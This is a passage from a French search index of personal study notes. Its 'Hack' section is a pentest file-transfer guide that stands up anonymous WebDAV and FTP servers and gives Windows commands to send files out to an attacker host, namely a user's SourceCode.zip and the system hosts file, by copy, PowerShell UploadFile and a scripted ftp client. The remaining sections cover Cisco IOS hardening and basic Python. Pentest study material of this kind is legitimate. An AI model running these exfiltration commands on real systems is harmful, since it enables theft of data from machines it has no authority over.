ouvrir \u00e0 des attaques potentielles. Pour plus d'informations \u00e0 ce sujet, nous pouvons lire la publication Microsoft Emp\u00eacher le trafic SMB des connexions lat\u00e9rales et entrer ou quitter le r\u00e9seau . Une alternative consiste \u00e0 ex\u00e9cuter SMB sur HTTP avec WebDav. WebDAV ( RFC 4918 ) est une extension de HTTP, le protocole Internet que les navigateurs Web et les serveurs Web utilisent pour communiquer entre eux. Le protocole WebDAV permet \u00e0 un serveur Web de se comporter comme un serveur de fichiers, prenant en charge la cr\u00e9ation de contenu collaboratif. WebDAV peut \u00e9galement utiliser HTTPS. Lorsque vous utilisez SMB, il tentera d'abord de se connecter \u00e0 l'aide du protocole SMB, et s'il n'y a pas de part SMB disponible, il essaiera de se connecter \u00e0 l'aide du protocole HTTP. Dans la capture de Wireshark suivante, nous essayons de nous connecter au partage de fichiers testing3, et parce qu'il n'a rien trouv\u00e9 avec SMB, il utilise HTTP.","title":"T\u00e9l\u00e9chargements SMB"},{"location":"Hack/transfert%20de%20fichier/#configuration-du-serveur-webdav","text":"Pour configurer notre serveur WebDav, nous devons installer deux modules Python, wsgidav et cheroot ( vous pouvez en savoir plus sur cette impl\u00e9mentation ici: wsgidav github )). Apr\u00e8s les avoir install\u00e9s, nous ex\u00e9cutons le wsgidav application dans le r\u00e9pertoire cible.","title":"Configuration du serveur WebDav"},{"location":"Hack/transfert%20de%20fichier/#installation-des-modules-webdav-python","text":"admin@pc[/pc]$ sudo pip install wsgidav cheroot [sudo] password for plaintext: Collecting wsgidav Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB) |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 171 kB 1.4 MB/s ...SNIP...","title":"Installation des modules WebDav Python"},{"location":"Hack/transfert%20de%20fichier/#utilisation-du-module-webdav-python","text":"admin@pc[/pc]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous [sudo] password for plaintext: Running without configuration file. 10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping. 10:02:53.950 - INFO : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31 10:02:53.950 - INFO : Lock manager: LockManager(LockStorageDict) 10:02:53.950 - INFO : Property manager: None 10:02:53.950 - INFO : Domain controller: SimpleDomainController() 10:02:53.950 - INFO : Registered DAV providers by route: 10:02:53.950 - INFO : - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous) 10:02:53.950 - INFO : - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous) 10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL. 10:02:53.950 - WARNING : Share '/' will allow anonymous write access. 10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access. 10:02:54.194 - INFO : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2 10:02:54.194 - INFO : Serving on http://0.0.0.0:80 ...","title":"Utilisation du module WebDav Python"},{"location":"Hack/transfert%20de%20fichier/#connexion-au-partage-webdav","text":"Nous pouvons maintenant essayer de nous connecter au partage en utilisant le DavWWWRoot r\u00e9pertoire. C:\\pc> dir \\\\192.168.49.128\\DavWWWRoot Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label. Volume Serial Number is 0000-0000 Directory of \\\\192.168.49.128\\DavWWWRoot 05/18/2022 10:05 AM <DIR> . 05/18/2022 10:05 AM <DIR> .. 05/18/2022 10:05 AM <DIR> sharefolder 05/18/2022 10:05 AM 13 filetest.txt 1 File(s) 13 bytes 3 Dir(s) 43,443,318,784 bytes free Remarque: DavWWWRoot est un mot cl\u00e9 sp\u00e9cial reconnu par Windows Shell. Aucun dossier de ce type n'existe sur votre serveur WebDAV. Le mot cl\u00e9 DavWWRoot indique au pilote Mini-Redirector, qui g\u00e8re les demandes WebDAV que vous vous connectez \u00e0 la racine du serveur WebDAV. Vous pouvez \u00e9viter d'utiliser ce mot-cl\u00e9 si vous sp\u00e9cifiez un dossier qui existe sur votre serveur lors de la connexion au serveur. Par exemple: \\ 192.168.49.128 \\ sharefolder","title":"Connexion au partage Webdav"},{"location":"Hack/transfert%20de%20fichier/#telechargement-de-fichiers-a-laide-de-smb","text":"C:\\pc> copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\ C:\\pc> copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\ Remarque: S'il n'y a pas de restrictions SMB ( TCP / 445 ), vous pouvez utiliser impacket-smbserver de la m\u00eame mani\u00e8re que nous l'avons configur\u00e9 pour les op\u00e9rations de t\u00e9l\u00e9chargement.","title":"T\u00e9l\u00e9chargement de fichiers \u00e0 l'aide de SMB"},{"location":"Hack/transfert%20de%20fichier/#telechargements-ftp_1","text":"Le t\u00e9l\u00e9chargement de fichiers \u00e0 l'aide de FTP est tr\u00e8s similaire au t\u00e9l\u00e9chargement de fichiers. Nous pouvons utiliser PowerShell ou le client FTP pour executer l'op\u00e9ration. Avant de d\u00e9marrer notre serveur FTP \u00e0 l'aide du module Python pyftpdlib, nous devons sp\u00e9cifier l'option --write pour permettre aux clients de t\u00e9l\u00e9charger des fichiers sur notre h\u00f4te d'attaque. admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21 --write /usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user. warnings.warn(\"write permissions assigned to anonymous user.\", [I 2022-05-18 10:33:31] concurrency model: async [I 2022-05-18 10:33:31] masquerade (NAT) address: None [I 2022-05-18 10:33:31] passive ports: None [I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<< Utilisons maintenant la fonction de t\u00e9l\u00e9chargement PowerShell pour t\u00e9l\u00e9charger un fichier sur notre serveur FTP.","title":"T\u00e9l\u00e9chargements FTP"},{"location":"Hack/transfert%20de%20fichier/#fichier-de-telechargement-powershell","text":"PS C:\\pc> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')","title":"Fichier de t\u00e9l\u00e9chargement PowerShell"},{"location":"Hack/transfert%20de%20fichier/#creer-un-fichier-de-commande-pour-le-client-ftp-pour-telecharger-un-fichier","text":"C:\\pc> echo open 192.168.49.128 > ftpcommand.txt C:\\pc> echo USER anonymous >> ftpcommand.txt C:\\pc> echo binary >> ftpcommand.txt C:\\pc> echo PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt C:\\pc> echo bye >> ftpcommand.txt C:\\pc> ftp -v -n -s:ftpcommand.txt ftp> open 192.168.49.128 Log in with USER and PASS first. ftp> USER anonymous ftp> PUT c:\\windows\\system32\\drivers\\etc\\hosts ftp> bye","title":"Cr\u00e9er un fichier de commande pour le client FTP pour t\u00e9l\u00e9charger un fichier"},{"location":"IOS/commande_ios/","text":"Commande ios Commande de base !--- commentaire # commentaire cisco router>? # aide router> # utilisateur router> enable # acc\u00e8s root router# configuration # acces configuration globale router>exit ou end # retour en arri\u00e8re router(config)#ip domain-name CCNA.com # chang\u00e9 nom de domaine (sensible \u00e0 la casse pour la notation dans PT) router(config)# no ip domain-lookup # d\u00e9sactiver la recherche dns show run | include default-gateway # afficher gateway !--- Rename le nom du switch ou server router(config)#hostname (hostname) # assigner un hostname router(config)#no hostname (hostname) # supprimer le hostname !--- Mot de passe et ssh router(config)#username any_user secret any_password # creer user et mot de passe pour ssh router(config)#service password-encryption # Crypter tous les mots de passe en clair router(config)#security password min-length 10 # D\u00e9finissez la longueur minimale du mot de passe sur 10 Configurer le mot de passe de console ainsi que celui du mode d'ex\u00e9cution privil\u00e9gi\u00e9. router(config)# line console 0 router(config-line)# password \"cisco\" # Attribuez \"cisco\" comme mot de passe de console, puis router(config-line)# login # activez la connexion router(config-line)# exit router(config)# enable secret \"class\" # Utilisez \"class\" comme mot de passe pour le mode d'ex\u00e9cution privil\u00e9gi\u00e9 chiffr\u00e9. Commande show router(config)#show vlan [brief | id vlan-id | name vlan-name | summary] router(config)#show running configuration # affiche la config du routeur router(config)#show arp # protocole r\u00e9solution d'adresse Protocol Address Age (min) Hardware Addr Type Interface Internet 209.165.201.1 - 0060.70B4.A601 ARPA GigabitEthernet0/0 router(config)#show flash # mem flash router(config)#show ip route # route router(config)#show interface # interface router(config)#show version # version router(config)#show ? # aide Configurer une banni\u00e8re MOTD (message of the day, ou message du jour) Dans cette \u00e9tape, vous allez configurer une banni\u00e8re MOTD pour afficher un avertissement d'acc\u00e8s non autoris\u00e9. Voici un exemple de texte : - Acc\u00e8s autoris\u00e9 uniquement. Utilisez la commande banner motd avec le message exemple. Vous pouvez choisir un autre message. router(config)# banner motd \"Acc\u00e8s autoris\u00e9 uniquement.\" Enregistrer le fichier de config router(config)#exit # quitter le mode root router>copy running-config startup-config router>wr Enregistrer sur la m\u00e9moire flash Sachez qu'en guise de proc\u00e9dure de sauvegarde suppl\u00e9mentaire, vous pouvez enregistrer votre fichier de configuration initiale dans la m\u00e9moire Flash. Par d\u00e9faut, le routeur continue \u00e0 charger la configuration initiale \u00e0 partir de la m\u00e9moire NVRAM, mais si cette m\u00e9moire est endommag\u00e9e, vous pouvez restaurer la configuration initiale en la copiant \u00e0 partir de la m\u00e9moire Flash. router(config)#copy startup-config flash router(config)#copy startup-config flash Configuration de port et ip ( Commande switchport ) Configurez un port s\u00e9curis\u00e9 Acc\u00e9dez \u00e0 la ligne de commande pour server et activez la s\u00e9curit\u00e9 des ports sur les ports Fast Ethernet 0/1 et 0/2. server(config)# interface range fa0/1 - 2 server(config-if-range)# switchport port-security D\u00e9finissez le maximum afin qu'un seul appareil puisse acc\u00e9der aux ports Fast Ethernet 0/1 et 0/2. server(config-if-range)# switchport port-security maximum 1 S\u00e9curisez les ports afin que l'adresse MAC d'un p\u00e9riph\u00e9rique soit dynamiquement apprise et ajout\u00e9e au r\u00e9seau en cours d'ex\u00e9cution. configuration. server(config-if-range)# switchport port-security mac-address sticky D\u00e9finissez la violation de sorte que les ports Fast Ethernet 0/1 et 0/2 ne soient pas d\u00e9sactiv\u00e9s lorsqu'une violation se produit, mais une notification de la violation de s\u00e9curit\u00e9 est g\u00e9n\u00e9r\u00e9e et les paquets provenant de la source inconnue sont supprim\u00e9s. server(config-if-range)# switchport port-security violation restrict D\u00e9sactivez tous les ports inutilis\u00e9s restants. Astuce : utilisez le mot-cl\u00e9 range pour appliquer cette configuration \u00e0 tous les ports simultan\u00e9ment. server(config-if-range)# interface range fa0/3 - 24 , gi0/1 - 2 server(config-if-range)# shutdown mode de port s\u00e9curis\u00e9 (config-if)#switchport port-security violation {protect | restrict | shutdown} Mode protect : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port arr\u00eate de transf\u00e9rer le trafic des adresses non autoris\u00e9es sans envoyer de message de log. Mode restrict : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port arr\u00eate de transf\u00e9rer le trafic des adresses non autoris\u00e9es et transmet un message de log. Mode shutdown : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port passe en \u00e9tat err-disabled (shutdown) et un message de log est envoy\u00e9. D\u00e9sactiver tous les ports de commutateur inutilis\u00e9s non utilis\u00e9 f0/2 jusqua f0/24 et g0/2 SW1(config)# interface range F0/2-24, G0/2 SW1(config-if-range)# shutdown Configurer l'ip et adress mask gateway router(config)#interface vlan 1 router(config)# ip address 192.168.1.253 255.255.255.0 router(config)# no shutdown #enable interface router(config)# exit router# show ip interface brief # v\u00e9rifier changement effectuer router(config)#ip default-gateway address # configurer gateway par default router(config)#no default-gateway address Vlan trunk ssh Cr\u00e9er et nommer des vlans router(config)#vlan 10 router(config-vlan)# name (namevlan10) router(config)#vlan 15 router(config-vlan)# name (namevlan15) Assignez des vlans a un port actif router(config)# interface f0/11 router(config-if)# switchport mode access router(config-if)# switchport access vlan 10 router(config-if)# switchport access vlan 15 Assignez le voice vlan a un port actif router(config)# interface f0/11 router(config-if)# mls qos trust cos router(config-if)# switchport voice vlan 150 # vlan 150 Configure trunks Un trunk est une liaison point \u00e0 point entre deux p\u00e9riph\u00e9riques r\u00e9seau. Fonctions du trunk : \u2022 Autoriser plusieurs VLAN sur un port \u2022 \u00c9tendre le VLAN sur l'ensemble du r\u00e9seau !--- Configurer G0/1 et G0/2 interfaces sur Server pour trunk. router(config)# interface range g0/1 - 2 router(config-if)# switchport mode trunk !--- Configure VLAN 99 as the native VLAN for G0/1 and G0/2 interfaces on S1. router(config-if)# switchport trunk native vlan 99 SSH D\u00e9sactivez la recherche DNS. server(config)# no ip domain-lookup Choisir un nom de domaine router(config)# ip domain-name CCNA.com creer un user de son choix avec un mot de passe s\u00e9curis\u00e9 router(config)# username any_user secret any_password Generer 1024-bit RSA keys. router(config)# crypto key generate rsa How many bits in the modulus [512]: 1024 Bloquez pendant trois minutes toute personne qui ne parvient pas \u00e0 se connecter apr\u00e8s quatre tentatives sur une p\u00e9riode de deux minutes. router(config)# login block-for 180 attempts 4 within 120 Configurez toutes les lignes VTY pour l'acc\u00e8s SSH et utilisez les profils d'utilisateurs locaux pour l'authentification. router(config)# line vty 0 4 router(config-line)# transport input ssh router(config-line)# login local R\u00e9glez le d\u00e9lai d'attente du mode EXEC sur 6 minutes sur les lignes VTY. router(config-line)# exec-timeout 6 Et sauvegarder","title":"Commande ios"},{"location":"IOS/commande_ios/#commande-ios","text":"","title":"Commande ios"},{"location":"IOS/commande_ios/#commande-de-base","text":"!--- commentaire # commentaire cisco router>? # aide router> # utilisateur router> enable # acc\u00e8s root router# configuration # acces configuration globale router>exit ou end # retour en arri\u00e8re router(config)#ip domain-name CCNA.com # chang\u00e9 nom de domaine (sensible \u00e0 la casse pour la notation dans PT) router(config)# no ip domain-lookup # d\u00e9sactiver la recherche dns show run | include default-gateway # afficher gateway !--- Rename le nom du switch ou server router(config)#hostname (hostname) # assigner un hostname router(config)#no hostname (hostname) # supprimer le hostname !--- Mot de passe et ssh router(config)#username any_user secret any_password # creer user et mot de passe pour ssh router(config)#service password-encryption # Crypter tous les mots de passe en clair router(config)#security password min-length 10 # D\u00e9finissez la longueur minimale du mot de passe sur 10","title":"Commande de base"},{"location":"IOS/commande_ios/#configurer-le-mot-de-passe-de-console-ainsi-que-celui-du-mode-dexecution-privilegie","text":"router(config)# line console 0 router(config-line)# password \"cisco\" # Attribuez \"cisco\" comme mot de passe de console, puis router(config-line)# login # activez la connexion router(config-line)# exit router(config)# enable secret \"class\" # Utilisez \"class\" comme mot de passe pour le mode d'ex\u00e9cution privil\u00e9gi\u00e9 chiffr\u00e9.","title":"Configurer le mot de passe de console ainsi que celui du mode d'ex\u00e9cution privil\u00e9gi\u00e9."},{"location":"IOS/commande_ios/#commande-show","text":"router(config)#show vlan [brief | id vlan-id | name vlan-name | summary] router(config)#show running configuration # affiche la config du routeur router(config)#show arp # protocole r\u00e9solution d'adresse Protocol Address Age (min) Hardware Addr Type Interface Internet 209.165.201.1 - 0060.70B4.A601 ARPA GigabitEthernet0/0 router(config)#show flash # mem flash router(config)#show ip route # route router(config)#show interface # interface router(config)#show version # version router(config)#show ? # aide","title":"Commande show"},{"location":"IOS/commande_ios/#configurer-une-banniere-motd-message-of-the-day-ou-message-du-jour","text":"Dans cette \u00e9tape, vous allez configurer une banni\u00e8re MOTD pour afficher un avertissement d'acc\u00e8s non autoris\u00e9. Voici un exemple de texte : - Acc\u00e8s autoris\u00e9 uniquement. Utilisez la commande banner motd avec le message exemple. Vous pouvez choisir un autre message. router(config)# banner motd \"Acc\u00e8s autoris\u00e9 uniquement.\"","title":"Configurer une banni\u00e8re MOTD (message of the day, ou message du jour)"},{"location":"IOS/commande_ios/#enregistrer-le-fichier-de-config","text":"router(config)#exit # quitter le mode root router>copy running-config startup-config router>wr","title":"Enregistrer le fichier de config"},{"location":"IOS/commande_ios/#enregistrer-sur-la-memoire-flash","text":"Sachez qu'en guise de proc\u00e9dure de sauvegarde suppl\u00e9mentaire, vous pouvez enregistrer votre fichier de configuration initiale dans la m\u00e9moire Flash. Par d\u00e9faut, le routeur continue \u00e0 charger la configuration initiale \u00e0 partir de la m\u00e9moire NVRAM, mais si cette m\u00e9moire est endommag\u00e9e, vous pouvez restaurer la configuration initiale en la copiant \u00e0 partir de la m\u00e9moire Flash. router(config)#copy startup-config flash router(config)#copy startup-config flash","title":"Enregistrer sur la m\u00e9moire flash"},{"location":"IOS/commande_ios/#configuration-de-port-et-ip-commande-switchport","text":"","title":"Configuration de port et ip ( Commande switchport )"},{"location":"IOS/commande_ios/#configurez-un-port-securise","text":"Acc\u00e9dez \u00e0 la ligne de commande pour server et activez la s\u00e9curit\u00e9 des ports sur les ports Fast Ethernet 0/1 et 0/2. server(config)# interface range fa0/1 - 2 server(config-if-range)# switchport port-security D\u00e9finissez le maximum afin qu'un seul appareil puisse acc\u00e9der aux ports Fast Ethernet 0/1 et 0/2. server(config-if-range)# switchport port-security maximum 1 S\u00e9curisez les ports afin que l'adresse MAC d'un p\u00e9riph\u00e9rique soit dynamiquement apprise et ajout\u00e9e au r\u00e9seau en cours d'ex\u00e9cution. configuration. server(config-if-range)# switchport port-security mac-address sticky D\u00e9finissez la violation de sorte que les ports Fast Ethernet 0/1 et 0/2 ne soient pas d\u00e9sactiv\u00e9s lorsqu'une violation se produit, mais une notification de la violation de s\u00e9curit\u00e9 est g\u00e9n\u00e9r\u00e9e et les paquets provenant de la source inconnue sont supprim\u00e9s. server(config-if-range)# switchport port-security violation restrict D\u00e9sactivez tous les ports inutilis\u00e9s restants. Astuce : utilisez le mot-cl\u00e9 range pour appliquer cette configuration \u00e0 tous les ports simultan\u00e9ment. server(config-if-range)# interface range fa0/3 - 24 , gi0/1 - 2 server(config-if-range)# shutdown","title":"Configurez un port s\u00e9curis\u00e9"},{"location":"IOS/commande_ios/#mode-de-port-securise","text":"(config-if)#switchport port-security violation {protect | restrict | shutdown} Mode protect : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port arr\u00eate de transf\u00e9rer le trafic des adresses non autoris\u00e9es sans envoyer de message de log. Mode restrict : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port arr\u00eate de transf\u00e9rer le trafic des adresses non autoris\u00e9es et transmet un message de log. Mode shutdown : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port passe en \u00e9tat err-disabled (shutdown) et un message de log est envoy\u00e9.","title":"mode de port s\u00e9curis\u00e9"},{"location":"IOS/commande_ios/#desactiver-tous-les-ports-de-commutateur-inutilises","text":"non utilis\u00e9 f0/2 jusqua f0/24 et g0/2 SW1(config)# interface range F0/2-24, G0/2 SW1(config-if-range)# shutdown","title":"D\u00e9sactiver tous les ports de commutateur inutilis\u00e9s"},{"location":"IOS/commande_ios/#configurer-lip-et-adress-mask-gateway","text":"router(config)#interface vlan 1 router(config)# ip address 192.168.1.253 255.255.255.0 router(config)# no shutdown #enable interface router(config)# exit router# show ip interface brief # v\u00e9rifier changement effectuer router(config)#ip default-gateway address # configurer gateway par default router(config)#no default-gateway address","title":"Configurer l'ip et adress mask gateway"},{"location":"IOS/commande_ios/#vlan-trunk-ssh","text":"","title":"Vlan trunk ssh"},{"location":"IOS/commande_ios/#creer-et-nommer-des-vlans","text":"router(config)#vlan 10 router(config-vlan)# name (namevlan10) router(config)#vlan 15 router(config-vlan)# name (namevlan15)","title":"Cr\u00e9er et nommer des vlans"},{"location":"IOS/commande_ios/#assignez-des-vlans-a-un-port-actif","text":"router(config)# interface f0/11 router(config-if)# switchport mode access router(config-if)# switchport access vlan 10 router(config-if)# switchport access vlan 15","title":"Assignez des vlans a un port actif"},{"location":"IOS/commande_ios/#assignez-le-voice-vlan-a-un-port-actif","text":"router(config)# interface f0/11 router(config-if)# mls qos trust cos router(config-if)# switchport voice vlan 150 # vlan 150","title":"Assignez le voice vlan a un port actif"},{"location":"IOS/commande_ios/#configure-trunks","text":"Un trunk est une liaison point \u00e0 point entre deux p\u00e9riph\u00e9riques r\u00e9seau. Fonctions du trunk : \u2022 Autoriser plusieurs VLAN sur un port \u2022 \u00c9tendre le VLAN sur l'ensemble du r\u00e9seau !--- Configurer G0/1 et G0/2 interfaces sur Server pour trunk. router(config)# interface range g0/1 - 2 router(config-if)# switchport mode trunk !--- Configure VLAN 99 as the native VLAN for G0/1 and G0/2 interfaces on S1. router(config-if)# switchport trunk native vlan 99","title":"Configure trunks"},{"location":"IOS/commande_ios/#ssh","text":"D\u00e9sactivez la recherche DNS. server(config)# no ip domain-lookup Choisir un nom de domaine router(config)# ip domain-name CCNA.com creer un user de son choix avec un mot de passe s\u00e9curis\u00e9 router(config)# username any_user secret any_password Generer 1024-bit RSA keys. router(config)# crypto key generate rsa How many bits in the modulus [512]: 1024 Bloquez pendant trois minutes toute personne qui ne parvient pas \u00e0 se connecter apr\u00e8s quatre tentatives sur une p\u00e9riode de deux minutes. router(config)# login block-for 180 attempts 4 within 120 Configurez toutes les lignes VTY pour l'acc\u00e8s SSH et utilisez les profils d'utilisateurs locaux pour l'authentification. router(config)# line vty 0 4 router(config-line)# transport input ssh router(config-line)# login local R\u00e9glez le d\u00e9lai d'attente du mode EXEC sur 6 minutes sur les lignes VTY. router(config-line)# exec-timeout 6 Et sauvegarder","title":"SSH"},{"location":"Python3/python/","text":"python var = entier,decimal,caract\u00e8re (int,float,string) \\n saut\u00e9 une ligne dans string ou print liste = ['salut' , '\u00e7a' , 'va'] print(liste[0:3]) print(*liste) Op\u00e9rateur Nom + Addition \u2013 Soustraction * Multiplication / Division % Modulo ** Puissance // Division enti\u00e8re x = 3 print:3 -= x -=3 print:0 soustraction /= x /=3 print:1 division *= x *= 3 print:12 multiplication += x += 3 print:6 addition := != true ou false non egal == true ou false egal <> true ou false plus grand ou plus petit <= >= true false plus petit, grand et \u00e9gal print(num:=int(input())) # creer une variable raw_input('tapez ip: ') # valeur entr\u00e9 au clavier input() # idem au dessus mais pour python3 int() deviens une valeur entier example int(raw_input('3')) print(\"\"\"texte sur plusieurs lignes\"\"\") >>> x = 3 >>> print \"x vaut : \" + str(x) x vaut : 3 # x etant un entier il ne peu pas s'additionner a une chaine de caract\u00e8re >>> x = 3.125 >>> print \"x vaut : \" + str(float(x)) x vaut : 3.125 >>> print \" x vaut : \" + str(int(x)) x vaut : 3 fonction input() # entr\u00e9e au clavier print() # afficher int('') # nombre entier : 3 float('') # nombre decimal : 3.254 str('') # chaine de caract\u00e8re .upper() # majuscule x = text.upper() .lower() # minuscule x = text.lower() .capitalize() # majuscule premi\u00e8re lettre len() # compte len(\"salut\") retourne 5 .pop() # supprime un \u00e9l\u00e9ment de liste liste.pop(1) .append() # ajoute a la fin d'une liste .insert(2,'') # ajoute a la place donn\u00e9 def fonct(): # cr\u00e9e sa fonction return if if 10 > 5: # attention aux deux points print(\"10 greater than 5\") print(\"Program ended\") else x = 4 if x == 5: print(\"Yes\") else: print(\"No\") elif num = 3 if num == 1: print(\"One\") elif num == 2: print(\"Two\") elif num == 3: print(\"Three\") else: print(\"Something else\") and et or temperature = 35 if temperature > 18 and temperature < 22: # temp supp a 18 et inf a 22 print('il fais bon') if temperature > 18 or temperature == 22: # temp supp a 18 ou \u00e9gal (boll\u00e9en) print('test') not print(not 1 == 1) false print(not 1 > 7) true Boucle for in for _ in range(): # nombre ou variable a = 1 b = 1 for loop in range(20): for loop in range(20): print(a * b, end=' ') b = b + 1 a = a+ 1 b = 1 print() while a=1 while a < 10: print(a) a = a + 1","title":"python"},{"location":"Python3/python/#python","text":"var = entier,decimal,caract\u00e8re (int,float,string) \\n saut\u00e9 une ligne dans string ou print liste = ['salut' , '\u00e7a' , 'va'] print(liste[0:3]) print(*liste) Op\u00e9rateur Nom + Addition \u2013 Soustraction * Multiplication / Division % Modulo ** Puissance // Division enti\u00e8re x = 3 print:3 -= x -=3 print:0 soustraction /= x /=3 print:1 division *= x *= 3 print:12 multiplication += x += 3 print:6 addition := != true ou false non egal == true ou false egal <> true ou false plus grand ou plus petit <= >= true false plus petit, grand et \u00e9gal print(num:=int(input())) # creer une variable raw_input('tapez ip: ') # valeur entr\u00e9 au clavier input() # idem au dessus mais pour python3 int() deviens une valeur entier example int(raw_input('3')) print(\"\"\"texte sur plusieurs lignes\"\"\") >>> x = 3 >>> print \"x vaut : \" + str(x) x vaut : 3 # x etant un entier il ne peu pas s'additionner a une chaine de caract\u00e8re >>> x = 3.125 >>> print \"x vaut : \" + str(float(x)) x vaut : 3.125 >>> print \" x vaut : \" + str(int(x)) x vaut : 3","title":"python"},{"location":"Python3/python/#fonction","text":"input() # entr\u00e9e au clavier print() # afficher int('') # nombre entier : 3 float('') # nombre decimal : 3.254 str('') # chaine de caract\u00e8re .upper() # majuscule x = text.upper() .lower() # minuscule x = text.lower() .capitalize() # majuscule premi\u00e8re lettre len() # compte len(\"salut\") retourne 5 .pop() # supprime un \u00e9l\u00e9ment de liste liste.pop(1) .append() # ajoute a la fin d'une liste .insert(2,'') # ajoute a la place donn\u00e9 def fonct(): # cr\u00e9e sa fonction return","title":"fonction"},{"location":"Python3/python/#if","text":"if 10 > 5: # attention aux deux points print(\"10 greater than 5\") print(\"Program ended\")","title":"if"},{"location":"Python3/python/#else","text":"x = 4 if x == 5: print(\"Yes\") else: print(\"No\")","title":"else"},{"location":"Python3/python/#elif","text":"num = 3 if num == 1: print(\"One\") elif num == 2: print(\"Two\") elif num == 3: print(\"Three\") else: print(\"Something else\")","title":"elif"},{"location":"Python3/python/#and-et-or","text":"temperature = 35 if temperature > 18 and temperature < 22: # temp supp a 18 et inf a 22 print('il fais bon') if temperature > 18 or temperature == 22: # temp supp a 18 ou \u00e9gal (boll\u00e9en) print('test')","title":"and et or"},{"location":"Python3/python/#not","text":"print(not 1 == 1) false print(not 1 > 7) true","title":"not"},{"location":"Python3/python/#boucle","text":"","title":"Boucle"},{"location":"Python3/python/#for-in","text":"for _ in range(): # nombre ou variable a = 1 b = 1 for loop in range(20): for loop in range(20): print(a * b, end=' ') b = b + 1 a = a+ 1 b = 1 print()","title":"for in"},{"location":"Python3/python/#while","text":"a=1 while a < 10: print(a) a = a + 1","title":"while"}]}